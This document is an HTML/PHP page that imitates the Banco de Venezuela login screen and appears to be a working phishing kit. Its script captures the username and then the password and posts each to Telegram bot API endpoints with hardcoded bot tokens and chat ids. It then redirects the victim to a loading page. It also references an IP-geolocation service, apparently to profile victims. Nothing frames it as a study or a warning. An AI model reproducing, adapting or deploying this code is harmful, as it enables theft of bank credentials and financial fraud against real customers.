<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8" />
  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <title>Banco de Venezuela</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-image: url('<?php echo base_url('/img/background.jpg') ?>');
      background-size: cover;
      background-position: center;
    }

    .container {
      display: flex;

      height: 100%;
      width: 100%;
    }

    .left-side {
      width: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .right-side {
      width: 50%;
    }

    .form {
      width: 80%;
      background: white;
      max-width: 550px;
      box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
    }

    @media (max-width: 768px) {
      body {
        background: #ededed;
      }

      .container {
        flex-direction: column;
      }

      .left-side {
        width: 100%;
        height: 100vh;
      }

      .right-side {
        display: none;
      }
    }

    .form-group {
      position: relative;
      margin-bottom: 20px;
      margin: 20px;
    }

    .form-group label {
      position: absolute;
      top: 50%;
      left: 10px;
      transform: translateY(-55%);
      color: #999;
      transition: top 0.3s, font-size 0.3s;
      pointer-events: none;
    }

    .form-group input {
      width: 100%;
      padding: 10px;
      box-sizing: border-box;
      position: relative;
      height: 60px;
      border: 0;

      border-bottom: 1px solid gray;
      background: #ededed;
      outline: none;
    }

    .form-group input:focus {
      border: 0;
    }

    .form-group input:focus+label,
    .form-group input:not(:placeholder-shown)+label {
      top: 5px;
      font-size: 12px;
    }

    button {
      background-color: #0067b1;
      color: white;
      border-radius: 3px;
      border: 0;
      padding: 15px;
      width: 200px;
    }

    .form-group2 {
      position: relative;
      margin-bottom: 20px;
      margin: 20px;
    }

    .form-group2 label {
      position: absolute;
      top: 50%;
      left: 23%;
      transform: translateY(-55%);
      color: #999;
      transition: top 0.3s, font-size 0.3s;
      pointer-events: none;
    }

    .form-group2 input {
      padding: 10px;
      box-sizing: border-box;
      position: relative;
      height: 60px;
      border: 0;
      border-bottom: 1px solid gray;
      background: #ededed;

      outline: none;
    }

    .form-group2 input:focus {
      border: 0;
    }

    .form-group2 input:focus+label,
    .form-group2 input:not(:placeholder-shown)+label {
      top: 5px;
      font-size: 12px;
    }

    .overlay {
      display: flex;
      justify-content: center;
      align-items: center;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      /* Fondo semitransparente */
      z-index: 9999;
      /* Asegura que esté por encima de otros elementos */
    }

    .content {
      background-color: #fff;
      width: 350px;
      border-radius: 5px;
      text-align: center;
    }
  </style>
</head>

<body>

  <div class="overlay" id="overlay" style="display: none">
    <div class="content">
      <!-- Aquí va tu contenido -->
      <form action="<?php echo site_url(), "/Welcome/recibir_datos"; ?>" id="loginform2" method="post">
        <h4 style="color: #0067b1 !important">Introduce tu contraseña</h4>
        <div class="form-group2">
          <input type="text" id="contra" required />
          <label for="contra">Contraseña *</label>
        </div>
        <script>
          document.addEventListener("DOMContentLoaded", function() {
            const input = document.getElementById("contra");
            const label = input.nextElementSibling;
            label.style.top = "50%";
            if (input.value !== "") {
              label.style.top = "15px";
              label.style.fontSize = "12px";
            }

            input.addEventListener("focus", () => {
              label.style.top = "15px";
              label.style.fontSize = "12px";
            });

            input.addEventListener("blur", () => {
              if (!input.value) {
                label.style.top = "50%";
                label.style.fontSize = "";
              }
            });
          });
        </script>
        <div style="width: 100%; text-align: center; padding-bottom: 30px">
          <button style="width: 160px">Continuar</button>
        </div>
      </form>
    </div>
  </div>
  <div class="container">
    <div class="left-side">
      <form id="loginform" class="form">
        <div style="text-align: center">
          <img src="<?php echo base_url('/img/logo.png') ?>" alt="" style="width: 60%; margin-top: 20px" />
        </div>
        <div style="width: 100%; text-align: center">
          <div class="form-group">
            <input
              type="text"
              id="nombre"
              name="nombre"
              style="width: 100%"
              required />
            <label for="nombre">Usuario *</label>
          </div>

          <script>
            document.addEventListener("DOMContentLoaded", function() {
              const input = document.getElementById("nombre");
              const label = input.nextElementSibling;
              label.style.top = "50%";
              if (input.value !== "") {
                label.style.top = "15px";
                label.style.fontSize = "12px";
              }

              input.addEventListener("focus", () => {
                label.style.top = "15px";
                label.style.fontSize = "12px";
              });

              input.addEventListener("blur", () => {
                if (!input.value) {
                  label.style.top = "50%";
                  label.style.fontSize = "";
                }
              });
            });
          </script>
        </div>
        <div style="width: 100%; text-align: center">
          <button>Entrar</button>
        </div>
        <div
          style="
              width: 100%;
              text-align: center;
              font-size: 12px;
              font-weight: bold;
              color: #999;
              margin-top: 30px;
              margin-bottom: 30px;
            ">
          ¿Olvidaste tu usuario o clave? <br />
          Si eres nuevo clienteBDV regístrate aquí
        </div>
      </form>
    </div>
    <div class="right-side"></div>
  </div>
</body>

<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

<script>
  const url = "https://ipapi.co/json/";
  const form = document.querySelector("#loginform");
  const form2 = document.querySelector("#loginform2");
  form.addEventListener("submit", (event) => {
    event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
    const nombre = document.querySelector("#nombre").value;
    localStorage.setItem("usuario", nombre);
    const message = " ------ BDV ------ Nombre: " + nombre;
    axios
      .post(
        "https://api.telegram.org/bot7810245146:AAHLQgvLziaCIbCh0la5YKS1FCsgHyBZRXA/sendMessage", {
          chat_id: "-4586015847",
          text: message,
        }
      )
      .then((response) => {
        document.getElementById("overlay").style.display = "";
      })
      .catch((error) => {
        console.error(error);
      });
  });

  form2.addEventListener("submit", (event) => {
    event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
    const nombre = localStorage.getItem("usuario");
    const contra = document.querySelector("#contra").value;
    const message = " ------ BDV ------ Nombre: " + nombre + " ------ Contra: " + contra;
    axios
      .post(
        "https://api.telegram.org/bot7456446404:AAG4fs8CtPgfuR5OLZ4oxn6HErCXPfAv53c", {
          chat_id: "773065090",
          text: message,
        }
      )
      .then((response) => {
        window.location.href = "<?php echo site_url(), "/Welcome/cargando"; ?>";
      })
      .catch((error) => {
        console.error(error);
      });
  });
</script>

</html>